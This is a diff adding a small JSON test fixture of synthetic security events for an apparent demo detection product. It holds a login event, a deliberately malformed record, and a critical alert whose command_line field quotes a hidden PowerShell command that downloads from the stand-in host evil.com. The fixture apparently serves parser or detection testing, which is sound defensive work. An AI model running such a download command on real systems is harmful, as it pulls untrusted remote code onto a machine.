@@ -1,0 +1,31 @@
+[
+  {
+    "source_event_id": "json-001",
+    "timestamp": "2023-10-01T15:20:00Z",
+    "vendor": "SentinelOps_Demo",
+    "product": "Synthetic",
+    "category": "AUTHENTICATION",
+    "class_name": "USER_SESSION",
+    "alert_type": "Login Success",
+    "severity": "INFO",
+    "user": "alice_admin",
+    "src_ip": "192.168.1.100"
+  },
+  {
+    "source_event_id": "json-002",
+    "timestamp": "2023-10-01T15:25:00Z",
+    "vendor": "SentinelOps_Demo",
+    "product": "Synthetic",
+    "category": "ENDPOINT_ACTIVITY",
+    "class_name": "PROCESS_ACTIVITY",
+    "alert_type": "PowerShell Download",
+    "severity": "CRITICAL",
+    "user": "alice_admin",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil.com')"
+  },
+  {
+    "malformed": "no_source_event_id",
+    "timestamp": "2023-10-01T15:30:00Z"
+  }
+]
